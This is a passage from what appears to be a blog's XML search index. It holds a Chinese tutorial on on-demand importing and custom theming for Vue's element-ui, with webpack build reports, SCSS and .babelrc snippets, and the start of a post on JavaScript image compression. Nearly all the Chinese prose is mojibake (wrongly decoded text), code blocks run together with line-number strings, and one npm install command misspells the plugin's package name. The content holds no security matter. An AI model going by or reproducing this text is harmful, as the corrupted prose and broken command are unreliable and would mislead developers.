name="fourth"&gt;å®šæ—¶ä»»åŠ¡è¡¥å¿&lt;/el-tab-pane&gt;&lt;/el-tabs&gt;&lt;el-steps :active="2" align-center&gt; &lt;el-step title="æ­¥éª¤1" description="è¿™æ˜¯ä¸€æ®µå¾ˆé•¿å¾ˆé•¿å¾ˆé•¿çš„æè¿°æ€§æ–‡å­—"&gt;&lt;/el-step&gt; &lt;el-step title="æ­¥éª¤2" description="è¿™æ˜¯ä¸€æ®µå¾ˆé•¿å¾ˆé•¿å¾ˆé•¿çš„æè¿°æ€§æ–‡å­—"&gt;&lt;/el-step&gt; &lt;el-step title="æ­¥éª¤3" description="è¿™æ˜¯ä¸€æ®µå¾ˆé•¿å¾ˆé•¿å¾ˆé•¿çš„æè¿°æ€§æ–‡å­—"&gt;&lt;/el-step&gt; &lt;el-step title="æ­¥éª¤4" description="è¿™æ˜¯ä¸€æ®µå¾ˆé•¿å¾ˆé•¿å¾ˆé•¿çš„æè¿°æ€§æ–‡å­—"&gt;&lt;/el-step&gt;&lt;/el-steps&gt; å†çœ‹ä¸€ä¸‹æ‰“åŒ…åŽçš„èµ„æºå¤§å°æƒ…å†µnpm run build --reportã€‚ 123456789101112131415Hash: 40db03677fe41f7369f6Version: webpack 3.12.0Time: 20874ms Asset Size Chunks Chunk Names static/css/app.cb8131545d15085cee647fe45f1d5561.css 234 kB 1 [emitted] app static/fonts/element-icons.732389d.ttf 56 kB [emitted] static/js/vendor.a753ce0919c8d42e4488.js 824 kB 0 [emitted] [big] vendor static/js/app.8c4c97edfce9c9069ea3.js 3.56 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/fonts/element-icons.535877f.woff 28.2 kB [emitted]static/css/app.cb8131545d15085cee647fe45f1d5561.css.map 332 kB [emitted] static/js/vendor.a753ce0919c8d42e4488.js.map 3.26 MB 0 [emitted] vendor static/js/app.8c4c97edfce9c9069ea3.js.map 16.6 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 506 bytes [emitted] å‘çŽ°æ‰“åŒ…åŽæå–å…¬å…±æ¨¡å— static/js/vendor.js æœ‰ 824kb å†çœ‹ä¸€ä¸‹å„ä¸ªæ¨¡å—å ç”¨æƒ…å†µï¼š å‘çŽ° elment-ui.common.js å ç”¨æœ€å¤§ã€‚æ‰€æœ‰æ¨¡å—èµ„æºæ€»å…±æœ‰ 642kbã€‚æ€Žä¹ˆæ‰èƒ½å‡å°æ‰“åŒ…åŽçš„å¤§å°å‘¢ï¼Ÿå¾ˆå®¹æ˜“å°±ä¼šæƒ³åˆ° ui çš„å¼•å…¥å’Œæ ·å¼çš„å¼•å…¥ä¸­ï¼Œå®žé™…æˆ‘ä»¬åªä½¿ç”¨äº†ä¸‰ä¸ªç»„ä»¶ï¼Œå´æ•´ä½“éƒ½è¢«æ‰“åŒ…äº†ï¼Œåœ¨è¿™é‡Œå¼•å…¥è¿™ä¸‰ä¸ªç»„ä»¶å³å¯ã€‚ æŒ‰éœ€å¼•å…¥ç»„ä»¶æ ·å¼æ–°å»ºä¸€ä¸ª element-variables.scss æ–‡ä»¶ï¼ˆä¸ºä»€ä¹ˆæ˜¯ SCSS æ–‡ä»¶ï¼ŒåŽé¢è‡ªå®šä¹‰ä¸»é¢˜ä¼šç”¨åˆ°ï¼‰ã€‚ 12345678/*iconå­—ä½“è·¯å¾„å˜é‡*/$--font-path: "~element-ui/lib/theme-chalk/fonts";/*æŒ‰éœ€å¼•å…¥ç”¨åˆ°çš„ç»„ä»¶çš„scssæ–‡ä»¶å’ŒåŸºç¡€scssæ–‡ä»¶*/@import "~element-ui/packages/theme-chalk/src/base.scss";@import "~element-ui/packages/theme-chalk/src/rate.scss";@import "~element-ui/packages/theme-chalk/src/button.scss";@import "~element-ui/packages/theme-chalk/src/row.scss"; æŒ‰éœ€å¼•å…¥ç»„ä»¶æ–°å»ºä¸€ä¸ª element-config.js æ–‡ä»¶ï¼Œå°†é¡¹ç›®ç”¨åˆ°çš„ element ç»„ä»¶å¼•å…¥ã€‚ 12345678910import &#123; Tabs, TabPane, Steps, Step &#125; from 'element-ui'export default &#123; install(V) &#123; V.use(Tabs) V.use(TabPane) V.use(Steps) V.use(Step) &#125;&#125; ç¬¬ä¸€æ¬¡ä¼˜åŒ–åŽæ‰“åŒ…åˆ†æžå°†ä»¥ä¸Š element-variables.scss å’Œ element-config.js å¼•å…¥åˆ° main.js ä¸­ã€‚ 1234import ElementUI from '@/assets/js/element-config'import '@/assets/css/element-variables.scss'Vue.use(ElementUI) è²Œä¼¼ä¸Šé¢ä¸€åˆ‡éƒ½å¾ˆé¡ºç†æˆç« ï¼Œæ‰“åŒ…åŽå¤§å°ä¼šå‡å°ã€‚ 123456789101112131415Hash: 2ef987c23a5d612e00e1Version: webpack 3.12.0Time: 17430ms Asset Size Chunks Chunk Names static/css/app.3c70d8d75c176393318b232a345e3f0f.css 38.8 kB 1 [emitted] app static/fonts/element-icons.732389d.ttf 56 kB [emitted] static/js/vendor.caa5978bb1eb0a15b097.js 824 kB 0 [emitted] [big] vendor static/js/app.5ebb19489355acc3167b.js 3.64 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/fonts/element-icons.535877f.woff 28.2 kB [emitted]static/css/app.3c70d8d75c176393318b232a345e3f0f.css.map 53.9 kB [emitted] static/js/vendor.caa5978bb1eb0a15b097.js.map 3.26 MB 0 [emitted] vendor static/js/app.5ebb19489355acc3167b.js.map 17 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 506 bytes [emitted] ç»“æžœå¯çŸ¥ï¼Œstatic/js/vendor.js è¿˜æ˜¯ 824kbï¼ å†çœ‹å„ä¸ªæ¨¡å—å ç”¨æƒ…å†µï¼š WHAT? ç«Ÿç„¶æ¨¡å—éƒ½æ²¡ä»€ä¹ˆå˜åŒ–ï¼Œå²‚ä¸æ˜¯ç«¹ç¯®æ‰“æ°´ï¼Œäº‹ä¸Žæ„¿è¿ã€‚ å†æ¬¡æ‰“åŒ…ä¼˜åŒ–å°è¯•åŽæ¥æŸ¥åˆ°æœ‰äººåŒæ ·é‡åˆ°è¿™ä¸ªé—®é¢˜ï¼Œæå‡ºä¸€ä¸ªissues#6362ï¼ŒåŽŸæ¥åªå¼•å…¥éœ€è¦çš„element-uiç»„ä»¶ï¼Œwebpackè¿˜æ˜¯æŠŠæ•´ä½“çš„ UI åº“å’Œæ ·å¼éƒ½æ‰“åŒ…äº†ï¼Œéœ€è¦ä¸€ä¸ª webpack çš„ babel æ’ä»¶ babel-plugin-componentï¼Œè¿™æ ·æ‰èƒ½çœŸæ­£æŒ‰éœ€å¼•å…¥æ‰“åŒ…ã€‚è¿™å—å…¶å®žè¢«å†™åˆ°å®˜æ–¹æ–‡æ¡£æ›´æ¢ è‡ªå®šä¹‰ä¸»é¢˜ çš„é…ç½®äº†ã€‚ äºŽæ˜¯ npm i babel-pugin-componet -D å®‰è£…åŽï¼Œåœ¨å¢žåŠ  .babelrc æ–‡ä»¶æ’ä»¶é…ç½® 12345678910111213141516171819202122&#123; "presets": [ ["env", &#123; "modules": false, "targets": &#123; "browsers": ["&gt; 1%", "last 2 versions", "not ie &lt;= 8"] &#125; &#125;], "stage-2" ], "plugins": [ "transform-vue-jsx", "transform-runtime", [ "component", &#123; "libraryName": "element-ui", "styleLibraryName": "theme-chalk" &#125; ] ]&#125; é¡µé¢è¿è¡Œæ­£å¸¸ï¼Œå†æ¬¡æ‰“åŒ…ã€‚ 123456789101112131415Hash: f182f70cb4ceee63b5d5Version: webpack 3.12.0Time: 10912ms Asset Size Chunks Chunk Names static/css/app.95c94c90ab11fdd4dfb413718f444d0c.css 39.9 kB 1 [emitted] app static/fonts/element-icons.732389d.ttf 56 kB [emitted] static/js/vendor.befb0a8962f74af4b7e2.js 157 kB 0 [emitted] vendor static/js/app.5343843cc20a78e80469.js 3.86 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/fonts/element-icons.535877f.woff 28.2 kB [emitted]static/css/app.95c94c90ab11fdd4dfb413718f444d0c.css.map 93.5 kB [emitted] static/js/vendor.befb0a8962f74af4b7e2.js.map 776 kB 0 [emitted] vendor static/js/app.5343843cc20a78e80469.js.map 17.1 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 506 bytes [emitted] static/js/vendor.js ç¡®å®žå˜å°äº†ï¼Œ157kBã€‚å†æ¥çœ‹å„ä¸ªæ¨¡å—åˆ†æžå›¾ã€‚ æ¨¡å—æ€»å…± 157.93KBï¼Œå°‘äº† 5 å€ï¼ æ›´æ¢ä¸»é¢˜-è¦†ç›–æ ·å¼element-ui çš„ theme-chalk ä½¿ç”¨ SCSS ç¼–å†™ï¼Œå¦‚æžœåœ¨è‡ªå·±çš„é¡¹ç›®ä¸­ä¹Ÿæ˜¯ç”¨ SCSSï¼Œé‚£ä¹ˆå¯ä»¥ç›´æŽ¥åœ¨é¡¹ç›®ä¸­æ”¹å˜æ ·å¼å˜é‡ï¼Œå› æ­¤å¯ä»¥åœ¨å‰é¢æ–°å»ºçš„ element-variables.scss æ–‡ä»¶ç”¨æ–°çš„ä¸»é¢˜é¢œè‰²å˜é‡è¦†ç›–å³å¯ã€‚ 1234567891011121314151617/*** è¦†ç›–ä¸»é¢˜è‰²*//*ä¸»é¢˜é¢œè‰²å˜é‡*/$--color-primary: #f0f;/*iconå­—ä½“è·¯å¾„å˜é‡*/$--font-path: '~element-ui/lib/theme-chalk/fonts';/* å¼•å…¥å…¨éƒ¨é»˜è®¤æ ·å¼ ä¼šå¼•å…¥æ²¡ç”¨åˆ°çš„ç»„ä»¶æ ·å¼ */// @import '~element-ui/packages/theme-chalk/src/index';/* æŒ‰éœ€å¼•å…¥ç”¨åˆ°çš„ç»„ä»¶çš„scssæ–‡ä»¶å’ŒåŸºç¡€scssæ–‡ä»¶ */@import '~element-ui/packages/theme-chalk/src/base.scss';@import '~element-ui/packages/theme-chalk/src/rate.scss';@import '~element-ui/packages/theme-chalk/src/button.scss';@import '~element-ui/packages/theme-chalk/src/row.scss'; çŽ°åœ¨æˆ‘ä»¬çš„ä¸»é¢˜å°±å˜æˆäº†é¢„æœŸæ•ˆæžœ å¯èƒ½ä½ å·²ç»æ³¨æ„åˆ°äº†ï¼Œè¿™é‡ŒæŽ¨èçš„æ˜¯åˆ†åˆ«å¼•å…¥ç”¨åˆ°çš„ç»„ä»¶æ ·å¼ï¼Œè€Œä¸æ˜¯å¼•å…¥å…¨éƒ¨é»˜è®¤æ ·å¼ï¼Œå› ä¸ºè¿™æ ·ä¼šå¯¼è‡´å¼•å…¥æ²¡æœ‰ä½¿ç”¨åˆ°çš„ç»„ä»¶æ ·å¼ã€‚æ¯”å¦‚å½“å‰æ¡ˆä¾‹ä¸­æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨åˆ° ColorPicker ç»„ä»¶ï¼Œåœ¨æ‰“åŒ…è¾“å‡ºçš„ css æ–‡ä»¶ä¸­ç¡®æœ‰è¯¥ç»„ä»¶æ ·å¼ã€‚ æ›´æ¢ä¸»é¢˜-çº¯å‡€æ ·å¼é€šè¿‡ä»¥ä¸Šä¼˜åŒ–å¯ä»¥æŒ‰éœ€çš„å°†æ‰€ç”¨åˆ°ç»„ä»¶æ‰“åŒ…ï¼ŒæŽ’é™¤æ²¡ç”¨åˆ°çš„ç»„ä»¶ï¼Œå‡å°‘åŒ…çš„å¤§å°ã€‚ä½†æ˜¯ï¼Œè¿˜æ˜¯å­˜åœ¨ä¸€ä¸ªå°ç‘•ç–µï¼šä¸€ä¸ªç”¨åˆ°çš„ç»„ä»¶æ ·å¼ä¼šè¢«ä¸¤æ¬¡æ‰“åŒ…ï¼Œä¸€æ¬¡æ˜¯é»˜è®¤çš„æ ·å¼ï¼Œä¸€æ¬¡æ˜¯è¦†ç›–çš„æ ·å¼ã€‚ å‡ºçŽ°è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºŽæˆ‘ä»¬åœ¨ä¸¤ä¸ªåœ°æ–¹å¯¹æ ·å¼è¿›è¡Œå¼•å…¥äº†ï¼Œä¸€ä¸ªæ˜¯åœ¨ .babelrc æ–‡ä»¶ä¸­é€šè¿‡ babel-plugin-component æ’ä»¶æŒ‰éœ€å¼•å…¥ element-ui ç»„ä»¶åŠå…¶é»˜è®¤æ ·å¼ï¼Œä¸€ä¸ªæ˜¯åœ¨ element-variables.scss æ–‡ä»¶ä¸­è¦†ç›–é»˜è®¤æ ·å¼ç”Ÿæˆçš„è‡ªå®šä¹‰æ ·å¼ã€‚ æ‰€ä»¥æ€Žæ ·å°†äºŒè€…ç»“åˆï¼Œå³babel-plugin-component æ’ä»¶æŒ‰éœ€å¼•å…¥çš„ç»„ä»¶æ ·å¼æ”¹æˆç”¨æˆ·è‡ªå®šä¹‰æ ·å¼ï¼Œè¾¾æˆçº¯å‡€æ ·å¼ç›®æ ‡å‘¢ï¼Ÿè¿™é‡Œå°±è¦ç”¨åˆ° element-ui çš„ä¸»é¢˜å·¥å…·è¿›è¡Œæ·±å±‚æ¬¡çš„ä¸»é¢˜å®šåˆ¶ã€‚ ä¸»é¢˜å’Œä¸»é¢˜å·¥å…·å®‰è£…é¦–å…ˆå®‰è£…ä¸»é¢˜å·¥å…· element-themeï¼Œå¯ä»¥å…¨å±€å®‰è£…ä¹Ÿå¯å®‰è£…åœ¨é¡¹ç›®ç›®å½•ã€‚è¿™é‡ŒæŽ¨èå®‰è£…åœ¨é¡¹ç›®å½•ï¼Œæ–¹ä¾¿åˆ«äºº clone é¡¹ç›®æ—¶èƒ½ç›´æŽ¥å®‰è£…ä¾èµ–å¹¶å¯åŠ¨ã€‚ 1npm i element-theme -D ç„¶åŽå®‰è£…ç™½åž©ä¸»é¢˜ï¼Œå¯ä»¥ä»Ž npm å®‰è£…æˆ–è€…ä»Ž GitHub æ‹‰å–æœ€æ–°ä»£ç ã€‚ 12345# ä»Ž npmnpm i element-theme-chalk -D# ä»Ž GitHubnpm i https://github.com/ElementUI/theme-chalk -D ä¸»é¢˜æž„å»ºelement-theme æ”¯æŒçš„æž„å»ºæœ‰ Node API å’Œ CLI æ–¹å¼ã€‚ é€šè¿‡ CLI æž„å»ºæ–¹å¼å¦‚æžœå…¨å±€å®‰è£…å¯ä»¥åœ¨å‘½ä»¤è¡Œé‡Œé€šè¿‡ et è°ƒç”¨å·¥å…·ï¼Œå¦‚æžœå®‰è£…åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œéœ€è¦é€šè¿‡ node_modules/.bin/et è®¿é—®åˆ°å‘½ä»¤ã€‚æ‰§è¡Œ -iï¼ˆ--initï¼‰ åˆå§‹åŒ–å˜é‡æ–‡ä»¶ã€‚é»˜è®¤è¾“å‡ºåˆ° element-variables.scssï¼Œå½“ç„¶ä½ å¯ä»¥ä¼ å‚æ•°æŒ‡å®šæ–‡ä»¶è¾“å‡ºç›®å½•ã€‚å¦‚æžœä½ æƒ³å¯ç”¨ watch æ¨¡å¼ï¼Œå®žæ—¶ç¼–è¯‘ä¸»é¢˜ï¼Œå¢žåŠ  -wï¼ˆ--watchï¼‰ å‚æ•°ï¼›å¦‚æžœä½ åœ¨åˆå§‹åŒ–æ—¶æŒ‡å®šäº†è‡ªå®šä¹‰å˜é‡æ–‡ä»¶ï¼Œåˆ™éœ€è¦å¢žåŠ  -cï¼ˆ--configï¼‰ å‚æ•°ï¼Œå¹¶å¸¦ä¸Šä½ çš„å˜é‡æ–‡ä»¶åã€‚é»˜è®¤æƒ…å†µä¸‹ç¼–è¯‘çš„ä¸»é¢˜ç›®å½•æ˜¯æ”¾åœ¨ ./theme ä¸‹ï¼Œä½ å¯ä»¥é€šè¿‡ -oï¼ˆ--outï¼‰ å‚æ•°æŒ‡å®šæ‰“åŒ…ç›®å½•ã€‚ 12345678# åˆå§‹åŒ–å˜é‡æ–‡ä»¶et --init [file path]# å®žæ—¶ç¼–è¯‘et --watch [--config variable file path] [--out theme path]# ç¼–è¯‘et [--config variable file path] [--out theme path] [--minimize] é€šè¿‡ Node API æž„å»ºæ–¹å¼å¼•å…¥ element-theme é€šè¿‡ Node API å½¢å¼æž„å»º 12345678910111213141516var et = require('element-theme')// å®žæ—¶ç¼–è¯‘æ¨¡å¼et.watch(&#123; config: 'variables/path', out: 'output/path'&#125;)// ç¼–è¯‘et.run(&#123; config: 'variables/path', // é…ç½®å‚æ•°æ–‡ä»¶è·¯å¾„ é»˜è®¤`./element-variables.css` out: 'output/path', // è¾“å‡ºç›®å½• é»˜è®¤`./theme` minimize: false, // åŽ‹ç¼©æ–‡ä»¶ browsers: ['ie &gt; 9', 'last 2 versions'], // æµè§ˆå™¨æ”¯æŒ components: ['button', 'input'] // é€‰å®šç»„ä»¶æž„å»ºè‡ªå®šä¹‰ä¸»é¢˜&#125;) åº”ç”¨ Node API æž„å»ºè‡ªå®šä¹‰ä¸»é¢˜åœ¨è¿™é‡Œï¼Œä¸ºäº†è®©ä¸»é¢˜çš„æž„å»ºæ›´åŠ ç›´è§‚å’Œè¢«é¡¹ç›®å…±äº«ï¼Œé‡‡ç”¨ Node API æ–¹å¼æž„å»ºï¼Œåœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º theme.jsæ–‡ä»¶ã€‚ 12345678910const et = require('element-theme')// ç¬¬ä¸€æ­¥ç”Ÿæˆæ ·å¼å˜é‡æ–‡ä»¶// et.init('./src/theme.scss')// ç¬¬äºŒæ­¥æ ¹æ®å®žé™…éœ€è¦ä¿®æ”¹è¯¥æ–‡ä»¶// ...// ç¬¬ä¸‰æ­¥æ ¹æ®è¯¥å˜é‡æ–‡ä»¶ç¼–è¯‘å‡ºè‡ªå®šä¹‰çš„ä¸»é¢˜æ ·å¼æ–‡ä»¶et.run(&#123; config: './src/theme.scss', out: './src/theme'&#125;) åœ¨ package.json ä¸­å¢žåŠ  scripts æŒ‡ä»¤ 12345&#123; "scripts": &#123; "theme": "node theme.js" &#125;&#125; è¿™æ ·å°±å¯ä»¥é€šè¿‡ npm run theme æŒ‡ä»¤æ¥ç¼–è¯‘ä¸»é¢˜äº†ã€‚ç¼–è¯‘è¿‡ç¨‹ï¼š è¿è¡Œè¯¥æŒ‡ä»¤åˆå§‹åŒ–ä¸»é¢˜å˜é‡æ–‡ä»¶ theme.scssã€‚ æ ¹æ®å®žé™…éœ€è¦ä¿®æ”¹è¿™ä¸ªæ–‡ä»¶é‡Œä¸»é¢˜æ ·å¼ã€‚ å†è¿è¡Œè¯¥æŒ‡ä»¤ç¼–è¯‘è¾“å‡ºè‡ªå®šä¹‰çš„ä¸»é¢˜æ ·å¼æ–‡ä»¶æ”¾åœ¨ theme ç›®å½•ä¸‹ã€‚ è¿™æ ·å°±å®Œæˆäº†æ‰€æœ‰è‡ªå®šä¹‰ä¸»é¢˜æ ·å¼çš„æž„å»ºã€‚è¦æƒ³å°†è¿™äº›è‡ªå®šä¹‰æ ·å¼éšç€ç»„ä»¶æŒ‰éœ€å¼•å…¥ï¼Œéœ€è¦å°† .babelrc æ–‡ä»¶ä¸­æŒ‰éœ€å¼•å…¥æ’ä»¶ babel-plugin-component å‚æ•° styleLibraryName ä»ŽåŽŸæœ¬çš„ element-ui é»˜è®¤æ ·å¼ç›®å½•å˜æˆçŽ°åœ¨è‡ªå®šä¹‰ç›®å½• ~src/themeã€‚ 1234567891011"plugins": [ "transform-vue-jsx", "transform-runtime", [ "component", &#123; "libraryName": "element-ui", "styleLibraryName": "~src/theme" &#125; ] ] ä¸€åˆ‡å‡†å¤‡å°±ç»ªï¼Œé¡¹ç›®æ‰“åŒ…ï¼Œæ‰“åŒ…åŽçš„ css æ–‡ä»¶ä¸­åªæœ‰å”¯ä¸€è‡ªå®šä¹‰æ ·å¼ï¼Œæ²¡æœ‰äº†é»˜è®¤æ ·å¼ï¼Œä¹Ÿä¸å­˜åœ¨æ²¡è¢«å¼•å…¥ç»„ä»¶çš„æ ·å¼ï¼Œå®žçŽ°äº†æˆ‘ä»¬é¢„æœŸçš„çº¯å‡€çš„è‡ªå®šä¹‰æ ·å¼ï¼ 123456789101112131415Hash: c442bcf9d471bddfdccfVersion: webpack 3.12.0Time: 10174ms Asset Size Chunks Chunk Names static/css/app.52d411d0c1b344066ec1f456355aa7b9.css 38.8 kB 1 [emitted] app static/fonts/element-icons.535877f.woff 28.2 kB [emitted] static/js/vendor.befb0a8962f74af4b7e2.js 157 kB 0 [emitted] vendor static/js/app.43c09c1f16b24d371e07.js 3.82 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js 857 bytes 2 [emitted] manifest static/fonts/element-icons.732389d.ttf 56 kB [emitted]static/css/app.52d411d0c1b344066ec1f456355aa7b9.css.map 81.3 kB [emitted] static/js/vendor.befb0a8962f74af4b7e2.js.map 776 kB 0 [emitted] vendor static/js/app.43c09c1f16b24d371e07.js.map 17.1 kB 1 [emitted] app static/js/manifest.2ae2e69a05c33dfc65f8.js.map 4.97 kB 2 [emitted] manifest index.html 506 bytes [emitted] ç”±äºŽæ ·å¼æ˜¯çº¯å‡€çš„ï¼Œcss æ–‡ä»¶å¤§å°ä»ŽåŽŸæ¥å®Œå…¨å¼•å…¥çš„ 234KB å˜æˆ 38.8KBï¼Œè¿›ä¸€æ­¥å‡å°äº†æ‰“åŒ…å¤§å°ã€‚ æ€»ç»“é€šè¿‡ä»¥ä¸Šå®žéªŒåˆ†æžæˆ‘ä»¬å¯ä»¥å¾—çŸ¥ï¼Œelement-ui è¦æƒ³å®žçŽ°æŒ‰éœ€å¼•å…¥å’Œçº¯å‡€çš„ä¸»é¢˜æ ·å¼ï¼š é¦–å…ˆé€šè¿‡ babel-plugin-component æ’ä»¶è¿›è¡ŒæŒ‰éœ€å¼•å…¥ã€‚ å†ç”¨ element-theme å·¥å…·ç”Ÿæˆæ ·å˜é‡æ–‡ä»¶ã€‚ ç„¶åŽæ ¹æ®é¡¹ç›®éœ€æ±‚ä¿®æ”¹è‡ªå®šä¹‰æ ·å¼ï¼Œä¾æ®è¯¥æ–‡ä»¶æž„å»ºç”Ÿæˆæ‰€æœ‰æ ·å¼ã€‚ æœ€åŽå°†æŒ‰éœ€å¼•å…¥æ ·å¼ styleLibraryName æŒ‡å‘è‡ªå®šä¹‰æ ·å¼ç›®å½•ã€‚ å¦‚æžœå¯¹æ ·å¼æå–è¦æ±‚ä¸é«˜ï¼Œå¯ç›´æŽ¥é‡‡å–å˜é‡è¦†ç›–å½¢å¼ï¼ˆåŒæ—¶å­˜åœ¨é»˜è®¤æ ·å¼ï¼‰ã€‚è¿˜æœ‰ä¸æ¸…æ¥šå¯ä»¥æˆ³è¿™é‡ŒæŸ¥çœ‹æ¡ˆä¾‹æºç ï¼Œèµ äºº starï¼Œæ‰‹æœ‰ä½™é¦™ã€‚ å®Œ~psï¼šä¸ªäººè§è§£æœ‰é™ï¼Œæ¬¢è¿ŽæŒ‡æ­£ã€‚]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
        <tag>element-ui</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[äº†è§£JSåŽ‹ç¼©å›¾ç‰‡ï¼Œè¿™ä¸€ç¯‡å°±å¤Ÿäº†]]></title>
    <url>%2F2020%2F06%2F07%2Fjs-image-compressor%2F</url>
    <content type="text"><![CDATA[å‰è¨€å…¬å¸çš„ç§»åŠ¨ç«¯ä¸šåŠ¡éœ€è¦åœ¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡æ˜¯ç”±å‰ç«¯åŽ‹ç¼©å›¾ç‰‡å¤§å°ï¼Œå†ä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œè¿™æ ·å¯ä»¥å‡å°‘ç§»åŠ¨ç«¯ä¸Šè¡Œæµé‡ï¼Œå‡å°‘ç”¨æˆ·ä¸Šä¼ ç­‰å¾…æ—¶é•¿ï¼Œä¼˜åŒ–ç”¨æˆ·ä½“éªŒã€‚ æ’æ’­ä¸€ä¸‹ï¼Œæœ¬æ–‡æ¡ˆä¾‹å·²æ•´ç†æˆæ’ä»¶ï¼Œå·²ä¸Šä¼  npm ï¼Œå¯é€šè¿‡ npm install js-image-compressor -D å®‰è£…ä½¿ç”¨ï¼Œå¯ä»¥ä»Ž github ä¸‹è½½ã€‚ JavaScript æ“ä½œåŽ‹ç¼©å›¾ç‰‡åŽŸç†ä¸éš¾ï¼Œå·²æœ‰æˆç†Ÿ APIï¼Œç„¶è€Œåœ¨å®žé™…è¾“å‡ºåŽ‹ç¼©åŽç»“æžœå´æ€»æœ‰æ„å¤–ï¼Œæœ‰äº›å›¾ç‰‡ç«Ÿä¼šè¶ŠåŽ‹ç¼©è¶Šå¤§ï¼ŒåŠ ä¹‹ç»ˆç«¯ï¼ˆæ‰‹æœºï¼‰ç±»åž‹ä¼—å¤šï¼Œæœ‰äº›æ‰‹æœºåŽ‹ç¼©å›¾ç‰‡ç”šè‡³å˜é»‘ã€‚ æ‰€ä»¥æœ¬æ–‡å°†è¯•å›¾è§£å†³å¦‚ä¸‹é—®é¢˜ï¼š å¼„æ¸… Image å¯¹è±¡ã€data URLã€Canvas å’Œ Fileï¼ˆBlobï¼‰ä¹‹é—´çš„è½¬åŒ–å…³ç³»ï¼› å›¾ç‰‡åŽ‹ç¼©å…³é”®æŠ€å·§ï¼› è¶…å¤§å›¾ç‰‡åŽ‹ç¼©é»‘å±é—®é¢˜ã€‚ è½¬åŒ–å…³ç³»åœ¨å®žé™…åº”ç”¨ä¸­æœ‰å¯èƒ½ä½¿ç”¨çš„æƒ…å¢ƒï¼šå¤§å¤šæ—¶å€™æˆ‘ä»¬ç›´æŽ¥è¯»å–ç”¨æˆ·ä¸Šä¼ çš„ File å¯¹è±¡ï¼Œè¯»å†™åˆ°ç”»å¸ƒï¼ˆcanvasï¼‰ä¸Šï¼Œåˆ©ç”¨ Canvas çš„ API è¿›è¡ŒåŽ‹ç¼©ï¼Œå®ŒæˆåŽ‹ç¼©ä¹‹åŽå†è½¬æˆ Fileï¼ˆBlobï¼‰ å¯¹è±¡ï¼Œä¸Šä¼ åˆ°è¿œç¨‹å›¾ç‰‡æœåŠ¡å™¨ï¼›ä¸å¦¨æœ‰æ—¶å€™æˆ‘ä»¬ä¹Ÿéœ€è¦å°†ä¸€ä¸ª base64 å­—ç¬¦ä¸²åŽ‹ç¼©ä¹‹åŽå†å˜ä¸º base64 å­—ç¬¦ä¸²ä¼ å…¥åˆ°è¿œç¨‹æ•°æ®åº“æˆ–è€…å†è½¬æˆ Fileï¼ˆBlobï¼‰ å¯¹è±¡ã€‚ä¸€èˆ¬çš„ï¼Œå®ƒä»¬æœ‰å¦‚ä¸‹è½¬åŒ–å…³ç³»ï¼š å…·ä½“å®žçŽ°ä¸‹é¢å°†æŒ‰ç…§è½¬åŒ–å…³ç³»å›¾ä¸­çš„è½¬åŒ–æ–¹æ³•ä¸€ä¸€å®žçŽ°ã€‚ file2DataUrl(file, callback)ç”¨æˆ·é€šè¿‡é¡µé¢æ ‡ç­¾ &lt;input type=&quot;file&quot; /&gt; ä¸Šä¼ çš„æœ¬åœ°å›¾ç‰‡ç›´æŽ¥è½¬åŒ– data URL å­—ç¬¦ä¸²å½¢å¼ã€‚å¯ä»¥ä½¿ç”¨ FileReader æ–‡ä»¶è¯»å–æž„é€ å‡½æ•°ã€‚FileReader å¯¹è±¡å…è®¸ Web åº”ç”¨ç¨‹åºå¼‚æ­¥è¯»å–å­˜å‚¨åœ¨è®¡ç®—æœºä¸Šçš„æ–‡ä»¶ï¼ˆæˆ–åŽŸå§‹æ•°æ®ç¼“å†²åŒºï¼‰çš„å†…å®¹ï¼Œä½¿ç”¨ File æˆ– Blob å¯¹è±¡æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶æˆ–æ•°æ®ã€‚è¯¥å®žä¾‹æ–¹æ³• readAsDataURL è¯»å–æ–‡ä»¶å†…å®¹å¹¶è½¬åŒ–æˆ base64 å­—ç¬¦ä¸²ã€‚åœ¨è¯»å–å®ŒåŽï¼Œåœ¨å®žä¾‹å±žæ€§ result ä¸Šå¯èŽ·å–æ–‡ä»¶å†…å®¹ã€‚ 1234567function file2DataUrl(file, callback) &#123; var reader = new FileReader(); reader.onload = function () &#123; callback(reader.result); &#125;; reader.readAsDataURL(file);&#125; Data URL ç”±å››ä¸ªéƒ¨åˆ†ç»„æˆï¼šå‰ç¼€ï¼ˆdata:ï¼‰ã€æŒ‡ç¤ºæ•°æ®ç±»åž‹çš„ MIME ç±»åž‹ã€å¦‚æžœéžæ–‡æœ¬åˆ™ä¸ºå¯é€‰çš„ base64 æ ‡è®°ã€æ•°æ®æœ¬èº«ï¼š data:[][;base64], æ¯”å¦‚ä¸€å¼  png æ ¼å¼å›¾ç‰‡ï¼Œè½¬åŒ–ä¸º base64 å­—ç¬¦ä¸²å½¢å¼ï¼šdata:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAAgAElEQVR4XuxdB5gã€‚ file2Image(file, callback)è‹¥æƒ³å°†ç”¨æˆ·é€šè¿‡æœ¬åœ°ä¸Šä¼ çš„å›¾ç‰‡æ”¾å…¥ç¼“å­˜å¹¶ img æ ‡ç­¾æ˜¾ç¤ºå‡ºæ¥ï¼Œé™¤äº†å¯ä»¥åˆ©ç”¨ä»¥ä¸Šæ–¹æ³•è½¬åŒ–æˆçš„ base64 